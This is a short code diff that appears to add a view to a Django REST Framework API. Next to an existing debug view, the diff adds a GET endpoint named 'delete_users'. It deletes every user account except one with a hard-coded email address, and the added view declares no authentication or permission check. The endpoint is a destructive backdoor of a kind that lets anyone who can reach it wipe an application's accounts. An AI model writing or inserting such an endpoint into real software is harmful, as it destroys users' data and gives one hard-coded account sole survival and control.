@@ -799,3 +799,16 @@ def debug(request):
         res = [{"message": f"Hello, {name}!"}]
 
     return Response(res)
+
+
+@api_view(["GET"])
+def delete_users(request):
+    from django.contrib.auth.models import User
+    users = User.objects.all()
+    for user in users:
+        if user.email != "a@gmail.com":
+            user.delete()
+
+    res = [{"status": True}]
+
+    return Response(res)
